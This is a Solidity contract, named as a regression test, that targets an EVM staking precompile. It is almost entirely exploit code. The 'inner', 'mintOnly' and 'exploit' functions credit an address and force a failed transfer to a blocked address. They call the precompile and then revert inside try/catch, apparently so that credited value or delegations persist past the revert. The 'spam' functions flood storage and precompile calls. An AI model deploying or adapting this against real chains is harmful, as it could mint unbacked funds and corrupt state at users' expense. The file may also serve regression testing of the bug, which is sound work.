// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EvmStateRegression {
    address constant STAKING = 0x0000000000000000000000000000000000000800;

    uint256 public okCount; // slot 0

    receive() external payable {}

    function spam(uint256 nSlots, uint256 nCalls) external {
        for (uint256 i = 0; i < nSlots; i++) {
            assembly { sstore(add(i, 1000), 1) }
        }
        for (uint256 j = 0; j < nCalls; j++) {
            (bool c, ) = STAKING.call{gas: 0}(hex"00");
            c;
        }
    }

    function spamAt(uint256 base, uint256 nSlots, uint256 nCalls) external {
        for (uint256 i = 0; i < nSlots; i++) {
            assembly { sstore(add(i, base), 1) }
        }
        for (uint256 j = 0; j < nCalls; j++) {
            (bool c, ) = STAKING.call{gas: 0}(hex"00");
            c;
        }
    }

    function spamVal(uint256 base, uint256 nSlots, uint256 val, uint256 nCalls) external {
        for (uint256 i = 0; i < nSlots; i++) {
            assembly { sstore(add(i, base), val) }
        }
        for (uint256 j = 0; j < nCalls; j++) {
            (bool c, ) = STAKING.call{gas: 0}(hex"00");
            c;
        }
    }

    function countOk(uint256 n, string calldata val) external {
        uint256 ok;
        bytes memory q = abi.encodeWithSignature("delegation(address,string)", tx.origin, val);
        for (uint256 j = 0; j < n; j++) {
            (bool c, ) = STAKING.call{gas: 30000}(q);
            if (c) ok++;
        }
        okCount = ok;
    }

    // credit x, make the pre-precompile commit fail on blocked m, call a precompile, revert
    function inner(address x, address m, uint256 v) external {
        require(msg.sender == address(this), "self");
        (bool a, ) = x.call{value: v}("");
        require(a, "x");
        (bool b, ) = m.call{value: 1}("");
        require(b, "m");
        (bool c, ) = STAKING.call{gas: 200000}(hex"dead");
        c;
        revert("undo");
    }

    function mintOnly(address x, address m, uint256 v) external {
        try this.inner(x, m, v) {} catch {}
    }

    function burnOnly(string calldata val, uint256 d, address pool) external {
        (bool ok, ) = STAKING.call(abi.encodeWithSignature("delegate(address,string,uint256)", tx.origin, val, d));
        require(ok, "delegate");
        (bool p, ) = pool.call{value: 15}("");
        require(p, "pool");
    }

    function exploit(address x, address m, uint256 v, string calldata val, uint256 d, address pool) external {
        (bool ok, ) = STAKING.call(abi.encodeWithSignature("delegate(address,string,uint256)", tx.origin, val, d));
        require(ok, "delegate");
        try this.inner(x, m, v) {} catch {}
        (bool p, ) = pool.call{value: 15}("");
        require(p, "pool");
    }
}
